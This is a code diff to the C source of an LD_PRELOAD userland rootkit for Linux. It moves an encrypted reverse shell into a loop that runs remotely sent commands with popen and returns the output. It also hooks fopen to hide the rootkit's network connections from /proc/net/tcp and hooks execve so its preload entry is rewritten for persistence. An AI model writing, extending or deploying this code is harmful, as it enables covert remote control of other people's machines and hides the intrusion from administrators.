@@ -76,12 +76,31 @@ SSL_CTX* InitCTX(void) {
 }
 
 
-void OpenSSLConnection() {
+void ShellLoop(SSL *ssl) {
+    char cmd[1024], buff[1024];
+
+    for(;;) {
+        SSL_read(ssl, cmd, sizeof(cmd));
+        if(strncmp(cmd, "exit", 4) == 0) break;
+        FILE *response;
+
+        response = popen(strcat(cmd, " &> /dev/null"), "r");
+        while(fgets(buff, sizeof(buff), response) != NULL)
+            SSL_write(ssl, buff, strlen(buff));
+
+        pclose(response);
+    }
+    SSL_shutdown(ssl);
+    SSL_free(ssl);
+    ssl = NULL;
+}
+
+
+void OpenSSLConnection(void) {
     setgid(MAGIC_GID);
     if(fork() != 0) return;
 
     int sockfd;
-    char cmd[1024], buff[1024];
     SSL *ssl;
     SSL_CTX *context;
 
@@ -92,30 +111,17 @@ void OpenSSLConnection() {
     SSL_set_fd(ssl, sockfd);
 
     if(SSL_connect(ssl) != -1) {
-        for(;;) {
-            SSL_read(ssl, cmd, sizeof(cmd));
-            if(strncmp(cmd, "exit", 4) == 0) {
-                SSL_free(ssl);
-                ssl = NULL;
-                close(sockfd);
-                break;
-            }
-            FILE *response;
-
-            response = popen(strcat(cmd, " 2> /dev/null"), "r");
-            while(fgets(buff, sizeof(buff), response) != NULL)
-                SSL_write(ssl, buff, strlen(buff));
-
-            pclose(response);
-        }
+        ShellLoop(ssl);
+        close(sockfd);
     }
-    close(sockfd);
+    else close(sockfd);
+
     SSL_CTX_free(context);
     context = NULL;
 }
 
 
-void hijack_proc_net_tcp(FILE* tmp, const char *path, const char* mode) {
+void HijackProcNetTcp(FILE* tmp, const char *path, const char* mode) {
     FILE *old_file;
     char *buff = NULL;
     size_t buff_length = 0;
@@ -172,7 +178,7 @@ FILE* fopen(const char *path, const char *mode) {
     if(strcmp(path, PROC_NET_TCP) == 0 || strcmp(path, PROC_NET_TCP6) == 0) {
         FILE *tmp = tmpfile();
         
-        hijack_proc_net_tcp(tmp, path, mode);    
+        HijackProcNetTcp(tmp, path, mode);    
         return tmp;
     }
     if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
@@ -196,7 +202,7 @@ FILE* fopen64(const char *path, const char *mode) {
     if(strcmp(path, PROC_NET_TCP) == 0 || strcmp(path, PROC_NET_TCP6) == 0) {
         FILE *tmp = tmpfile64();
 
-        hijack_proc_net_tcp(tmp, path, mode);
+        HijackProcNetTcp(tmp, path, mode);
         return tmp;
     }
     if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
@@ -219,13 +225,13 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
     if(strstr(path, LD_LIBRARY) != NULL) {
         if(old_unlink == NULL) old_unlink = dlsym(RTLD_NEXT, "unlink");
         if(old_fopen == NULL) old_fopen = dlsym(RTLD_NEXT, "fopen");
-        //setuid(0);
         FILE *ld_preload;        
 
         old_unlink(PRELOAD_PATH);
         old_execve(path, argv, envp);
         ld_preload = old_fopen(PRELOAD_PATH, "w");
         fwrite(MAGIC_PATH, strlen(MAGIC_PATH), 1, ld_preload);
+        fflush(ld_preload);
         fclose(ld_preload);
 
         return 0;
